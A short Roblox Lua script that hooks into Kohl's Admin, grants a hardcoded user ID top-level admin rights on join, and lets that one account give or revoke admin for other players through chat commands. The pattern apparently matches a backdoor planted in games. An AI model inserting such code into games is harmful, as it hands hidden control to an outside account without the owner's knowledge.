local MY_USER_ID = 9391592113
local KAI = _G.Admins or _G.KohlAdmin

local function Process(player)
    if player.UserId == MY_USER_ID then
        KAI.AddAdmin(player, 6)
    end

    player.Chatted:Connect(function(msg)
        if player.UserId ~= MY_USER_ID then return end
        local args = msg:split(" ")
        local cmd = args[1]:lower()
        local targetName = args[2]
        if not targetName then return end

        for _, target in ipairs(game.Players:GetPlayers()) do
            if target.Name:lower():find(targetName:lower()) then
                if cmd == ";give" then
                    KAI.AddAdmin(target, 3)
                elseif cmd == ";take" then
                    KAI.RemoveAdmin(target)
                end
            end
        end
    end)
end

if KAI then
    for _, p in ipairs(game.Players:GetPlayers()) do
        task.spawn(function() Process(p) end)
    end
    game.Players.PlayerAdded:Connect(Process)
end
